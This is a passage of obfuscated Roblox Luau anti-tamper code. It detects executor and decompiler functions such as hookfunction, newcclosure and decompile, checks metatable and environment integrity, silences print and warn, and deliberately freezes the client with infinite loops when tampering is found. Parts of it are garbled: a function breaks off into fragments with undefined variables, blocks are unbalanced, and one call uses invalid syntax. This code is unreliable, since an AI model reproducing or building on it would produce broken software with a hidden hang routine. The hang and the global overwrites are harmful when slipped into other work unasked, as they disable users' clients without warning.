 if type(_0QM1ZbJWeSV0)=="function" then rawset(_G,string.char(103,101,116,112,114,111,116,111,115),function()error("")end) end
 _0HPqe1SXm6jO(function() rawset(string,string.char(100,117,109,112),function()error("")end) end)
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0Gh5JTveeHPb=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,99,111,109,112,105,108,101))
 if type(_0Gh5JTveeHPb)=="function" then rawset(_G,string.char(100,101,99,111,109,112,105,108,101),function()error("")end) end
 local _0kvgbfj2813T=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,117,109,112,115,116,114,105,110,103))
 if type(_0kvgbfj2813T)=="function" then rawset(_G,string.char(100,117,109,112,115,116,114,105,110,103),function()error("")end) end
 local _0TuzifLA0xwj=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101))
 if type(_0TuzifLA0xwj)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101),function()error("")end) end
 local _0lAmT2tEfBFm=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101))
 if type(_0lAmT2tEfBFm)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101),function()error("")end) end
 local _0aXb8vK10k5q=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,111,110,115,116,97,110,116,115))
 if type(_0aXb8vK10k5q)=="function" then rawset(_G,string.char(103,101,116,99,111,110,115,116,97,110,116,115),function()error("")end) end
 local _0QCTYOSszHiF=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,117,112,118,97,108,117,101,115))
 if type(_0QCTYOSszHiF)=="function" then rawset(_G,string.char(103,101,116,117,112,118,97,108,117,101,115),function()error("")end) end
 local _0pSXOuKIccKA=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,112,114,111,116,111,115))
 if type(_0pSXOuKIccKA)=="function" then rawset(_G,string.char(103,101,116,112,114,111,116,111,115),function()error("")end) end
 _0HPqe1SXm6jO(function() rawset(string,string.char(100,117,109,112),function()error("")end) end)
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0UJKSgXWbZau=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,99,111,109,112,105,108,101))
 if type(_0UJKSgXWbZau)=="function" then rawset(_G,string.char(100,101,99,111,109,112,105,108,101),function()error("")end) end
 local _0shB3kGVUl1u=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,117,109,112,115,116,114,105,110,103))
 if type(_0shB3kGVUl1u)=="function" then rawset(_G,string.char(100,117,109,112,115,116,114,105,110,103),function()error("")end) end
 local _0vaTZmWHdnyF=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101))
 if type(_0vaTZmWHdnyF)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101),function()error("")end) end
 local _0B4oq0xhADp6=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101))
 if type(_0B4oq0xhADp6)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101),function()error("")end) end
 local _0m_jxI0nVFqx=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,111,110,115,116,97,110,116,115))
 if type(_0m_jxI0nVFqx)=="function" then rawset(_G,string.char(103,101,116,99,111,110,115,116,97,110,116,115),function()error("")end) end
 local _0a_AyXX3iU0F=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,117,112,118,97,108,117,101,115))
 if type(_0a_AyXX3iU0F)=="function" then rawset(_G,string.char(103,101,116,117,112,118,97,108,117,101,115),function()error("")end) end
 local _0Sie8kByM0b6=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,112,114,111,116,111,115))
 if type(_0Sie8kByM0b6)=="function" then rawset(_G,string.char(103,101,116,112,114,111,116,111,115),function()error("")end) end
 _0HPqe1SXm6jO(function() rawset(string,string.char(100,117,109,112),function()error("")end) end)
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0fVHxdX70cdW=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,99,111,109,112,105,108,101))
 if type(_0fVHxdX70cdW)=="function" then rawset(_G,string.char(100,101,99,111,109,112,105,108,101),function()error("")end) end
 local _0hroQqDQzLdP=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,117,109,112,115,116,114,105,110,103))
 if type(_0hroQqDQzLdP)=="function" then rawset(_G,string.char(100,117,109,112,115,116,114,105,110,103),function()error("")end) end
 local _0bdnMa1QWHKY=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101))
 if type(_0bdnMa1QWHKY)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101),function()error("")end) end
 local _0pehAHcHxMJg=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101))
 if type(_0pehAHcHxMJg)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101),function()error("")end) end
 local _0EVpvJBQFCGf=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,111,110,115,116,97,110,116,115))
 if type(_0EVpvJBQFCGf)=="function" then rawset(_G,string.char(103,101,116,99,111,110,115,116,97,110,116,115),function()error("")end) end
 local _0It0cRrrTij8=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,117,112,118,97,108,117,101,115))
 if type(_0It0cRrrTij8)=="function" then rawset(_G,string.char(103,101,116,117,112,118,97,108,117,101,115),function()error("")end) end
 local _0H9TzC7r9683=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,112,114,111,116,111,115))
 if type(_0H9TzC7r9683)=="function" then rawset(_G,string.char(103,101,116,112,114,111,116,111,115),function()error("")end) end
 _0HPqe1SXm6jO(function() rawset(string,string.char(100,117,109,112),function()error("")end) end)
 end)
end
local _0XtLw_Oecqad=function()
 _0HPqe1SXm6jO(function()
 local _rs=game:GetService(string.char(82,117,110,83,101,114,118,105,99,101))
 while true do _rs.Heartbeat:Wait() end
 end)
 local _0SnYISgEIlM7=coroutine.wrap(function() while true do coroutine.yield() end end)
 while true do _0HPqe1SXm6jO(_0SnYISgEIlM7) end
end
if _0DtpP7yxAvKF then
 _0HPqe1SXm6jO(function() rawset(_G,string.char(119,97,114,110),function()end) end)
 _0HPqe1SXm6jO(function() rawset(_G,string.char(112,114,105,110,116),function()end) end)
 _0HPqe1SXm6jO(function() rawset(_G,string.char(100,101,99,111,109,112,105,108,101),function()error("")end) end)
 _0HPqe1SXm6jO(function() rawset(_G,string.char(100,117,109,112,115,116,114,105,110,103),function()error("")end) end)
 _0XtLw_Oecqad()
 return
end
do
 _0HPqe1SXm6jO(function()
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(119,97,114,110)) then rawset(_G,string.char(119,97,114,110),function()end) end
 local _dc=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,99,111,109,112,105,108,101))
 if type(_dc)=="function" then rawset(_G,string.char(100,101,99,111,109,112,105,108,101),function()error("")end) end
 local _ds=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,117,109,112,115,116,114,105,110,103))
 if type(_ds)=="function" then rawset(_G,string.char(100,117,109,112,115,116,114,105,110,103),function()error("")end) end
 end)
end
do
 local _0LYXVtu0Nww6=false
 local _0kc7HvRRw1e9=""
 local _0Fto4ofgyBoe=tostring
 local _0vf_HcAFTvqI=pcall
 local _0p5l2Tig7I9f=type
 local _0g4_KnYqR_yQ=rawget
 local _0h8ZegoLhat0=rawequal
 local _0WVtkAXmxd76=select
 _0vf_HcAFTvqI(function()
 local _0obXlEMlzXNq=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(104,111,111,107,102,117,110,99,116,105,111,110))
 if _0p5l2Tig7I9f(_0obXlEMlzXNq)=="function" then
 _0LYXVtu0Nww6=true;_0kc7HvRRw1e9=string.char(104,102)
 end
 end)
 _0vf_HcAFTvqI(function()
 if _0g4_KnYqR_yQ(_G,string.char(110,101,119,99,99,108,111,115,117,114,101))~=nil or
 _0g4_KnYqR_yQ(_G,string.char(114,101,112,108,97,99,101,99,108,111,115,117,114,101))~=nil then
 _0LYXVtu0Nww6=true;_0kc7HvRRw1e9=string.char(99,99)
 end
 end)
 _0vf_HcAFTvqI(function()
 local _probe=function() end
 local _0rfa6TwX79ry=_0Fto4ofgyBoe(_probe)
 if _0p5l2Tig7I9f(_0rfa6TwX79ry)~="string" then
 _0LYXVtu0Nww6=true;_0kc7HvRRw1e9=string.char(116,115)
 end
 
 if _kp then
 local _base=_0g4_KnYqR_yQ(_G,_k:sub(1,_kp-1))
 if _base then _cur=_0g4_KnYqR_yQ(_base,_k:sub(_kp+1)) end
 else _cur=_0g4_KnYqR_yQ(_G,_k) end
 if _cur~=nil and not _0h8ZegoLhat0(_cur,_ref) then _0XtLw_Oecqad();return end
 if _cur~=nil and tostring(_cur)~=_0Mq47II2KkJM[_k] then _0XtLw_Oecqad();return end
 end
 if _dbgU and _dbgU.getupvalues then
 local _ok,_u=pcall(_dbgU.getupvalues,_0g4_KnYqR_yQ(_G,string.char(112,99,97,108,108))) if _ok and _u and #_u~=_0wK4dzBq8saG and _0wK4dzBq8saG~=-1 then _0XtLw_Oecqad();return end
 end
 end
 local _rs=_0g4_KnYqR_yQ(_G,string.char(103,97,109,101))
 if not _rs then return end
 local _ok,_0Dr7xyHLNP9n=_0vf_HcAFTvqI(function() return _rs:GetService(string.char(82,117,110,83,101,114,118,105,99,101)) end)
 if not _ok or not _0Dr7xyHLNP9n then return end
 local _0AcLNazbPTwJ=0
 _0vf_HcAFTvqI(function()
 _0rpoDPd9PWco=_0Dr7xyHLNP9n.Heartbeat:Connect(function(dt)
 _0AcLNazbPTwJ=_0AcLNazbPTwJ+dt
 if _0AcLNazbPTwJ<1 then return end
 _0AcLNazbPTwJ=0
 _0vf_HcAFTvqI(_0nf7bkCfWHbR)
 end)
 end)
 end)
end
do
 _0vf_HcAFTvqI(function()
 local _0JayBuyvIz0e=_0g4_KnYqR_yQ(_G,string.char(103,101,116,109,101,116,97,116,97,98,108,101))
 local _0vugz1590IWc=_0g4_KnYqR_yQ(_G,string.char(103,101,116,114,97,119,109,101,116,97,116,97,98,108,101))
 if type(_0JayBuyvIz0e)~="function" then return end
 local _ws=_0g4_KnYqR_yQ(_G,string.char(119,111,114,107,115,112,97,99,101))
 if not _ws then return end
 local _0JOZpZxYtcYX=_0JayBuyvIz0e(_ws)
 if not _0JOZpZxYtcYX then return end
 local _0WXidVnLGjE9={}
 _0WXidVnLGjE9[string.char(95,95,110,97,109,101,99,97,108,108)]=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,110,97,109,101,99,97,108,108))
 _0WXidVnLGjE9[string.char(95,95,105,110,100,101,120)]=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,105,110,100,101,120))
 _0WXidVnLGjE9[string.char(95,95,110,101,119,105,110,100,101,120)]=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,110,101,119,105,110,100,101,120))
 _0WXidVnLGjE9[string.char(95,95,116,111,115,116,114,105,110,103)]=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,116,111,115,116,114,105,110,103))
 _0WXidVnLGjE9[string.char(95,95,108,101,110)]=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,108,101,110))
 _0WXidVnLGjE9[string.char(95,95,99,97,108,108)]=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,99,97,108,108))
 _0WXidVnLGjE9[string.char(95,95,99,111,110,99,97,116)]=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,99,111,110,99,97,116))
 local _gMT=_0JayBuyvIz0e(_G)
 local _gMTsnap={}
 if _gMT then
 _gMTsnap[string.char(95,95,105,110,100,101,120)]=_0g4_KnYqR_yQ(_gMT,string.char(95,95,105,110,100,101,120))
 _gMTsnap[string.char(95,95,110,101,119,105,110,100,101,120)]=_0g4_KnYqR_yQ(_gMT,string.char(95,95,110,101,119,105,110,100,101,120))
 end
 local _0ICIuc6LUwGt=function()
 do
 local _cur=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,110,97,109,101,99,97,108,108))
 local _orig=_0WXidVnLGjE9[string.char(95,95,110,97,109,101,99,97,108,108)]
 if not _0h8ZegoLhat0(_cur,_orig) then _0XtLw_Oecqad();return end
 if _cur~=nil and tostring(_cur)~=tostring(_orig) then _0XtLw_Oecqad();return end
 end
 do
 local _cur=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,105,110,100,101,120))
 local _orig=_0WXidVnLGjE9[string.char(95,95,105,110,100,101,120)]
 if not _0h8ZegoLhat0(_cur,_orig) then _0XtLw_Oecqad();return end
 if _cur~=nil and tostring(_cur)~=tostring(_orig) then _0XtLw_Oecqad();return end
 end
 do
 local _cur=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,110,101,119,105,110,100,101,120))
 local _orig=_0WXidVnLGjE9[string.char(95,95,110,101,119,105,110,100,101,120)]
 if not _0h8ZegoLhat0(_cur,_orig) then _0XtLw_Oecqad();return end
 if _cur~=nil and tostring(_cur)~=tostring(_orig) then _0XtLw_Oecqad();return end
 end
 do
 local _cur=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,116,111,115,116,114,105,110,103))
 local _orig=_0WXidVnLGjE9[string.char(95,95,116,111,115,116,114,105,110,103)]
 if not _0h8ZegoLhat0(_cur,_orig) then _0XtLw_Oecqad();return end
 if _cur~=nil and tostring(_cur)~=tostring(_orig) then _0XtLw_Oecqad();return end
 end
 do
 local _cur=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,108,101,110))
 local _orig=_0WXidVnLGjE9[string.char(95,95,108,101,110)]
 if not _0h8ZegoLhat0(_cur,_orig) then _0XtLw_Oecqad();return end
 if _cur~=nil and tostring(_cur)~=tostring(_orig) then _0XtLw_Oecqad();return end
 end
 do
 local _cur=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,99,97,108,108))
 local _orig=_0WXidVnLGjE9[string.char(95,95,99,97,108,108)]
 if not _0h8ZegoLhat0(_cur,_orig) then _0XtLw_Oecqad();return end
 if _cur~=nil and tostring(_cur)~=tostring(_orig) then _0XtLw_Oecqad();return end
 end
 do
 local _cur=_0g4_KnYqR_yQ(_0JOZpZxYtcYX,string.char(95,95,99,111,110,99,97,116))
 local _orig=_0WXidVnLGjE9[string.char(95,95,99,111,110,99,97,116)]
 if not _0h8ZegoLhat0(_cur,_orig) then _0XtLw_Oecqad();return end
 if _cur~=nil and tostring(_cur)~=tostring(_orig) then _0XtLw_Oecqad();return end
 end
 if _gMT then
 local _ci=_0g4_KnYqR_yQ(_gMT,string.char(95,95,105,110,100,101,120))
 local _cn=_0g4_KnYqR_yQ(_gMT,string.char(95,95,110,101,119,105,110,100,101,120))
 if not _0h8ZegoLhat0(_ci,_gMTsnap[string.char(95,95,105,110,100,101,120)]) then _0XtLw_Oecqad();return end
 if not _0h8ZegoLhat0(_cn,_gMTsnap[string.char(95,95,110,101,119,105,110,100,101,120)]) then _0XtLw_Oecqad();return end
 end
 if _0vugz1590IWc then
 local _raw=_0vf_HcAFTvqI(function()
 local _a=_0JayBuyvIz0e(_ws);local _b=_0vugz1590IWc(_ws)
 if _a~=_b then _0XtLw_Oecqad() end
 end)
 end
 end
 _0vf_HcAFTvqI(_0ICIuc6LUwGt)
 local _rs=_0g4_KnYqR_yQ(_G,string.char(103,97,109,101))
 if not _rs then return end
 local _ok,_0bz_lZXnLyUx=_0vf_HcAFTvqI(function() return _rs:GetService(string.char(82,117,110,83,101,114,118,105,99,101)) end)
 if not _ok or not _0bz_lZXnLyUx then return end
 local _0ttLtcu2lZuT=0
 _0vf_HcAFTvqI(function()
 _0BiJOblPuZy_=_0bz_lZXnLyUx.Heartbeat:Connect(function(dt)
 _0ttLtcu2lZuT=_0ttLtcu2lZuT+dt
 if _0ttLtcu2lZuT<0.75 then return end
 _0ttLtcu2lZuT=0
 _0vf_HcAFTvqI(_0ICIuc6LUwGt)
 end)
 end)
 end)
end
 if _0LYXVtu0Nww6 then
 _0XtLw_Oecqad()
 return
 end
end
do
 local _0HPqe1SXm6jO=pcall
 local _0c_RHsGUq4zl=0
 local _0Jbn8b_bkcQS
 _0HPqe1SXm6jO(function()
 local _rs=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _rs then return end
 local _ok,_rssvc=_0HPqe1SXm6jO(function() return _rs:GetService(string.char(82,117,110,83,101,114,118,105,99,101)) end)
 if not _ok then return end
 _0Jbn8b_bkcQS=_rssvc.Heartbeat:Connect(function()
 _0c_RHsGUq4zl=_0c_RHsGUq4zl+1
 end)
 local _t=0
 repeat _t=_t+task.wait() until _0c_RHsGUq4zl>=2
 _0Jbn8b_bkcQS:Disconnect()
 if _0c_RHsGUq4zl>8 then _0XtLw_Oecqad() end
 end)
 local _0BF4YSREiW6W=_0HPqe1SXm6jO(function()
 Instance.new(string.char(80,97,114,116)):90E26969(string.char(97))
 end)
 while _0BF4YSREiW6W do _0XtLw_Oecqad() end
 local _0MdEsxk8OQDg=true
 _0HPqe1SXm6jO(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 _g:GetChildren(function()
 _0MdEsxk8OQDg=false
 while true do ;({})[nil]=true end
 end)
 end)
 if not _0MdEsxk8OQDg then _0XtLw_Oecqad() end
 _0HPqe1SXm6jO(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _0PH_H8F5KuMw=#_g:GetChildren()
 if _0PH_H8F5KuMw>50 then _0XtLw_Oecqad() end
 end)
 _0HPqe1SXm6jO(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_0JEuX8qpzfhP=_0HPqe1SXm6jO(function()
 return _g:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101))
 end)
 if not _ok or not _0JEuX8qpzfhP then return end
 local _0R7c2WN8e9qV,_0Wi8MEcXmv2H=_0HPqe1SXm6jO(function()
 return _0JEuX8qpzfhP:JSONDecode(string.char(91,53,56,50,44,32,34,102,49,50,56,99,56,50,50,34,44,32,116,114,117,101,44,32,49,49,51,44,32,102,97,108,115,101,44,32,91,50,49,44,32,110,117,108,108,44,32,34,56,53,57,48,55,99,97,51,34,93,44,32,110,117,108,108,93))
 end)
 if not _0R7c2WN8e9qV then _0XtLw_Oecqad();return end
 if _0Wi8MEcXmv2H and _0Wi8MEcXmv2H[6] and _0Wi8MEcXmv2H[6][2]~=nil then _0XtLw_Oecqad() end
 end)
 local _0R7c2WN8e9qV=_0HPqe1SXm6jO(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then error("") end
 local _=_g.HttpService
 end)
 if _0R7c2WN8e9qV then _0XtLw_Oecqad() end
 _0HPqe1SXm6jO(function()
 local _gf=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,102,101,110,118))
 if type(_gf)~="function" then return end
 rawset(_G,string.char(95,103,103,57,101,49,101,48,99,102,98),string.char(50,56,102,101,50,98,102,99,57,98,51,52))
 local _0RchkATxrVF_=_gf()[string.char(95,103,103,57,101,49,101,48,99,102,98)]
 rawset(_G,string.char(95,103,103,57,101,49,101,48,99,102,98),nil)
 if _0RchkATxrVF_~=string.char(50,56,102,101,50,98,102,99,57,98,51,52) then _0XtLw_Oecqad() end
 end)
 _0HPqe1SXm6jO(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_0AuFaZ8lcPxV=_0HPqe1SXm6jO(function() _g() end)
 if _ok then _0XtLw_Oecqad();return end
 if not _0AuFaZ8lcPxV:find(string.char(97,116,116,101,109,112,116,32,116,111,32,99,97,108,108)) then _0XtLw_Oecqad() end
 end)
 _0HPqe1SXm6jO(function()
 local _sentinel=string.char(99,99,53,56,52,48,97,55,97,53,54,97,56,102,97,57)
 rawset(_G,string.char(95,103,103,57,101,49,101,48),_sentinel)
 local _0Z8IKHvGrpDw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(95,103,103,57,101,49,101,48))
 local _0rsHwsIApxXZ=_G[string.char(95,103,103,57,101,49,101,48)]
 rawset(_G,string.char(95,103,103,57,101,49,101,48),nil)
 if _0Z8IKHvGrpDw~=_0rsHwsIApxXZ then _0XtLw_Oecqad() end
 end)
 _0HPqe1SXm6jO(function()
 local _0jowlaoi7tAy=rawget(string,string.char(103,115,117,98))
 if type(_0jowlaoi7tAy)~="function" then _0XtLw_Oecqad();return end
 local _0XEE9Nq_SBdu=_0jowlaoi7tAy(string.char(97,88,98,88,99),string.char(88),string.char(95))
 if _0XEE9Nq_SBdu~=string.char(97,95,98,95,99) then _0XtLw_Oecqad() end
 end)
 _0HPqe1SXm6jO(function()
 local _0WaMFsxUbM8n=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,114,97,119,109,101,116,97,116,97,98,108,101))
 local _0LFyDp7fw0fB=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,109,101,116,97,116,97,98,108,101))
 if type(_0WaMFsxUbM8n)~="function" or type(_0LFyDp7fw0fB)~="function" then return end
 local _ws=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(119,111,114,107,115,112,97,99,101))
 if not _ws then return end
 local _0MTKpju5dTVp=_0WaMFsxUbM8n(_ws)
 local _0NjJ5BIdM2FM=_0LFyDp7fw0fB(_ws)
 if _0MTKpju5dTVp~=_0NjJ5BIdM2FM then _0XtLw_Oecqad() end
 end)
end
do
 pcall(function()
 local _cr=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(99,111,114,111,117,116,105,110,101))
 if not _cr then return end
 local _0zCf7vKin3BZ=_cr.running()
 if _0zCf7vKin3BZ~=nil then
 local _0bApS4sRLQHB=_cr.status(_0zCf7vKin3BZ)
 if _0bApS4sRLQHB~=string.char(114,117,110,110,105,110,103) then _0XtLw_Oecqad() end
 end
 end)
 pcall(function()
 local _dbg=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,98,117,103))
 if not _dbg or not _dbg.getinfo then return end
 local _info=_dbg.getinfo(rawget)
 if _info and _info.what~=string.char(67) then _0XtLw_Oecqad() end
 local _info2=_dbg.getinfo(pcall)
 if _info2 and _info2.what~=string.char(67) then _0XtLw_Oecqad() end
 local _info3=_dbg.getinfo(tostring)
 if _info3 and _info3.what~=string.char(67) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _0qut3NnVUhEq=tostring(rawget)
 local _0hehr_6DHtXj=tostring(rawget)
 if _0qut3NnVUhEq~=_0hehr_6DHtXj then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _tp=rawget(table,string.char(112,97,99,107))
 if type(_tp)~="function" then return end
 local _0GAgwrVyz02b=_tp(1,2,3)
 if not _0GAgwrVyz02b or _0GAgwrVyz02b.n~=3 then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _mr=rawget(math,string.char(114,97,110,100,111,109))
 if type(_mr)~="function" then return end
 local _0ZOz_3fQvnFd=_mr(1,1)
 if _0ZOz_3fQvnFd~=1 then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _0AFPy8OBqfSS={}
 rawset(_0AFPy8OBqfSS,string.char(56,48,54,52,55,52,55,51,101,56,97,54),string.char(48,55,56,52,102,100,100,98,97,98,101,56))
 local _0iXUK1PQwjBj=rawget(_0AFPy8OBqfSS,string.char(56,48,54,52,55,52,55,51,101,56,97,54))
 if _0iXUK1PQwjBj~=string.char(48,55,56,52,102,100,100,98,97,98,101,56) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _s=string.char(56,55,56,53,97,97,51,53,101,101,48,49,100,48,102,99)
 local _0CmyXsUBx6wC=#_s
 local _0VvuTo4IywLl=string.len(_s)
 if _0CmyXsUBx6wC~=_0VvuTo4IywLl then _0XtLw_Oecqad() end
 if _0CmyXsUBx6wC~=16 then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _0F2msgldKut2=pcall(function() end)
 if type(_0F2msgldKut2)~="boolean" then _0XtLw_Oecqad() end
 if _0F2msgldKut2~=true then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _dbg=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,98,117,103))
 if not _dbg or not _dbg.getinfo then return end
 local _i1=_dbg.getinfo(rawget,string.char(117))
 if _i1 and _i1.nups and _i1.nups>0 then _0XtLw_Oecqad() end
 local _i2=_dbg.getinfo(rawset,string.char(117))
 if _i2 and _i2.nups and _i2.nups>0 then _0XtLw_Oecqad() end
 local _i3=_dbg.getinfo(tostring,string.char(117))
 if _i3 and _i3.nups and _i3.nups>0 then _0XtLw_Oecqad() end
 end)
end
do
 pcall(function()
 local _tw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,121,112,101,111,102))
 local _in=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(73,110,115,116,97,110,99,101))
 if not _tw or not _in then return end
 if _tw(_in.new)~=string.char(102,117,110,99,116,105,111,110) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _tw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(116,121,112,101,111,102))
 local _in=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(73,110,115,116,97,110,99,101))
 if not _tw or not _in then return end
 local _ok,_p=pcall(_in.new,string.char(80,97,114,116))
 if _ok and _p then
 if _tw(_p)~=string.char(73,110,115,116,97,110,99,101) then _0XtLw_Oecqad() end
 pcall(function() _p:Destroy() end)
 end
 end)
 pcall(function()
 local _g=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,97,109,101))
 if not _g then return end
 local _ok,_0n5KqS_3Udy2=pcall(function() return _g.ClassName end)
 if _ok and _0n5KqS_3Udy2~=string.char(68,97,116,97,77,111,100,101,108) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 if tostring(true)~=string.char(116,114,117,101) then _0XtLw_Oecqad() end
 if tostring(false)~=string.char(102,97,108,115,101) then _0XtLw_Oecqad() end
 if tostring(nil)~=string.char(110,105,108) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 if math.huge~=math.huge*2 then _0XtLw_Oecqad() end
 if math.huge<=1e308 then _0XtLw_Oecqad() end
 if type(math.huge)~=string.char(110,117,109,98,101,114) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _r=string.rep(string.char(54,54,100,53),5)
 if _r~=string.char(54,54,100,53,54,54,100,53,54,54,100,53,54,54,100,53,54,54,100,53) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _0SZvZPts2OL2={10,20,30}
 table.remove(_0SZvZPts2OL2,1)
 if #_0SZvZPts2OL2~=2 or _0SZvZPts2OL2[1]~=20 then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _0IhncXrtS1e5=select(string.char(35),1,2,3,4,5)
 if _0IhncXrtS1e5~=5 then _0XtLw_Oecqad() end
 end)
 pcall(function()
 if type(nil)~=string.char(110,105,108) then _0XtLw_Oecqad() end
 if type({})~=string.char(116,97,98,108,101) then _0XtLw_Oecqad() end
 if type(1)~=string.char(110,117,109,98,101,114) then _0XtLw_Oecqad() end
 if type("x")~=string.char(115,116,114,105,110,103) then _0XtLw_Oecqad() end
 if type(true)~=string.char(98,111,111,108,101,97,110) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 if rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(105,111))~=nil then _0XtLw_Oecqad() end
 local _os=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(111,115))
 if _os and rawget(_os,string.char(101,120,101,99,117,116,101))~=nil then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _gf=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,102,101,110,118))
 if type(_gf)~="function" then return end
 local _f0=_gf(0)
 if rawequal(_f0,_G) then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _cy=rawget(coroutine,string.char(121,105,101,108,100))
 if type(_cy)~="function" then return end
 local _ok=pcall(_cy)
 if _ok then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _smt=getmetatable("")
 if not _smt then return end
 local _idx=rawget(_smt,string.char(95,95,105,110,100,101,120))
 if _idx~=string then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _mt=rawget(math,string.char(116,121,112,101))
 if type(_mt)~="function" then return end
 if _mt(1)~=string.char(105,110,116,101,103,101,114) then _0XtLw_Oecqad() end
 if _mt(1.0)~=string.char(102,108,111,97,116) then _0XtLw_Oecqad() end
 if _mt("x")~=false then _0XtLw_Oecqad() end
 end)
 pcall(function()
 local _0SZvZPts2OL2={1,2,3,4,5}
 local _0iVYmgH21EfW=rawlen(_0SZvZPts2OL2)
 if _0iVYmgH21EfW~=5 then _0XtLw_Oecqad() end
 end)
 pcall(function()
